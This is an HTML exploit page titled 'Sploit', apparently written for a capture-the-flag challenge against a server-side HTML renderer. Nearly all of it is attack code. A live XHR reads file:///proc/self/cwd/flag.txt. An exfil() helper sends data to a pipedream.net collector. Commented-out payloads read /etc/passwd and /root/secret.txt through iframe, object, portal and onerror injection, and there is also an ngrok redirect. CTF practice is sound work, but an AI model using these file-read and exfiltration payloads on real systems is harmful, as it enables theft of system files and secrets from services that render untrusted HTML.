<html>
  <body>
    <h3>Sploit</h3>
    <!-- <iframe src="http://f5fcff4cf627.ngrok.io/redir" width=500 height=500></iframe> -->
    <!-- <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/> -->
    <!-- <link rel=attachment href="file:///root/secret.txt"> -->
    <!-- <object data="file:///etc/passwd"> -->
    <!-- <portal src="file:///etc/passwd" id=portal> -->
    <div id="log"></div>

    <script>
      try {
        function log(msg) {
          var txt = document.createElement('div');
          txt.innerText = msg;
          document.getElementById('log').appendChild(txt);
        }

        function get(url, sucCB) {
          try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.onload = function () {
              log('[xhr.status]: ' + xhr.status);
              if (xhr.status == 200) {
                if (sucCB) {
                  sucCB(xhr.responseText)
                }
              } else {
                log('[xhr.resError]: ' + xhr.responseText);
              }
            }

            xhr.send();
          } catch (e) {
            log('[xhr.error]: ' + e);
          }
        }

        function exfil(data) {
          var url = 'http://enmgyy579qoy.x.pipedream.net?d=' + data;
          get(url, function() {
            log('[exfil.success]: ' + data);
          });
        }

        x=new XMLHttpRequest;x.onload=function(){ document.body.innerText=this.responseText; };x.open("GET","file:///proc/self/cwd/flag.txt");x.send();
        /*get('file:///proc/self/cwd/flag.txt', function(txt) {
          log('[remotetxt]' + txt)
          exfil(txt);
        });*/

        //log(window.parent.location)
        //log(Object.keys(document).join(", "))
        //Object.keys(window).forEach(function(k) {
         // log(k)
        //})
        //log(Object.keys(window).join(", "))
        /*get('http://remote2.thcon.party:10750', function(txt) {
          log('[data]' + txt)
        });*/

        //exfil('hi');
      } catch (e) {
        log('[error]: ' + e);
      }
      //log(document.location);

      // When replacing the window, application crashes, but request is still made
      // window.location.replace('http://enmgyy579qoy.x.pipedream.net?d=windowopen');
    </script>
  </body>
</html>
